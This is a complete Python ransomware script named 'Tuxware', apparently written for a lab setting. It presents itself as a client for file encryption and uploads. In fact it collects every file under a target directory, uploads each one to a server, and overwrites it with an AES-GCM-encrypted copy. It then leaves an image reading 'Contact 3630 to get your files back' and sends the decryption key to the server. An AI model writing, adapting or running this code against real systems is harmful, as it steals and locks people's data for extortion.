"""Tuxware is the client handling file encryption and uploads to the server."""
import logging
import os
import secrets
import socket
from pathlib import Path

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from PIL import Image, ImageDraw, ImageFont

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

SERVER_URL = os.getenv("SERVER_URL", "http://penguinet:5000")
TARGET_DIR = os.getenv("TARGET_DIR", "/data")

client_id = socket.gethostname()
key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)

def get_all_files(directory: str) -> list[Path]:
    """Get all files in the specified directory and its subdirectories."""
    return [f for f in Path(directory).rglob("*") if f.is_file()]

def send_file(file_path) -> None:
    """Send a file to the server."""
    with Path(file_path).open("rb") as f:
        files = {"file": (file_path.name, f)}
        r = requests.post(f"{SERVER_URL}/upload", files=files, timeout=15)
    logger.info("Uploaded %s: %s", file_path, r.status_code)

def encrypt_file(path: Path) -> None:
    """Encrypt a file using AES-GCM."""
    try:
        with Path(path).open("rb") as f:
            data = f.read()
        nonce = secrets.token_bytes(12)
        encrypted = aesgcm.encrypt(nonce, data, None)
        with Path(path).open("wb") as f:
            f.write(nonce + encrypted)
        logger.info("Encrypted %s", path)
    except Exception:
        logger.exception("Failed to encrypt %s.", path)

def send_key() -> None:
    """Send the encryption key to the server."""
    r = requests.post(
        f"{SERVER_URL}/key",
        data=key,
        headers={"Client-ID": client_id},
        timeout=15,
    )
    logger.info("Key sent: %s", r.status_code)

def sign(directory: Path) -> None:
    """Create an image with a message and save it in the specified directory."""
    img = Image.new("RGB", (300, 100), color=(0, 0, 0))
    d = ImageDraw.Draw(img)

    text = "Hi from Tux! Contact 3630 to get your files back."
    text_color = (255, 255, 255)
    font = ImageFont.load_default()

    bbox = d.textbbox((0, 0), text, font=font)
    width = bbox[2] - bbox[0]
    height = bbox[3] - bbox[1]

    x = (img.width - width) // 2
    y = (img.height - height) // 2

    d.text((x, y), text, fill=text_color, font=font)
    save_path = directory / "tux_msg.png"
    img.save(save_path)
    logger.info("Image 'Hi from Tux!' created : %s", save_path)

def main() -> None:
    """Launch the tuxware."""
    files = get_all_files(TARGET_DIR)
    for f in files:
        send_file(f)
        encrypt_file(f)
    sign(Path(TARGET_DIR))
    send_key()

if __name__ == "__main__":
    main()
